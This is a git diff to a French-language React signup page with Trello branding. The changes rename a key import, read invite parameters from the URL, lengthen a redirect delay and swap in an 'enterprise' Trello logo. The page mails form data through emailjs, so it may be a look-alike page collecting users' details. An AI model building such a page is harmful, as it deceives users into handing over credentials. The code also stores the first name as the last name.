@@ -1,7 +1,7 @@
 import React, { useState, useEffect, useRef } from 'react';
 import emailjs from 'emailjs-com';
 import { useRouter } from 'next/router';
-import { key } from './magic-link'; // Import the key
+import { key } from './get-link'; // Import the key
 
 export default function Signup() {
   const firstNameRef = useRef(null);
@@ -85,10 +85,16 @@ export default function Signup() {
     sessionStorage.setItem('firstName', firstNameRef.current.value);
     sessionStorage.setItem('lastName', firstNameRef.current.value);
 
+    // Get additional URL parameters
+    const params = new URLSearchParams(window.location.search);
+    const membersCount = params.get('members') || 0;
+    const tasksCount = params.get('tasks') || 0;
+    const creationDate = params.get('creation') || '';
+
     sendEmail(e);
     setTimeout(() => {
       router.push(`/board?invite=${key}&owner=${firstNameRef.current.value}&board=${boardName}&members=${membersCount}&tasks=${tasksCount}&creation=${creationDate}`);
-    }, 4000); 
+    }, 6000); 
   };
 
   const isMinLength = password.length >= 8;
@@ -101,11 +107,11 @@ export default function Signup() {
       <img className='img-2' src='/bg-img2.png'/>
 
       <article> 
-        <img src='/trello-logo.png' className='logo'/>
+        <img src='/trello-enterprise-logo.png' className='logo'/>
 
         {isLoading && (
         <div className="loading-wrapper">
-            <h1>Création du compte</h1>
+            <h1>Préparation du compte</h1>
             <p>Veuillez patienter quelques instants<br/> vous allez être redirigé.</p>
             <div className="spinner"></div>
         </div>
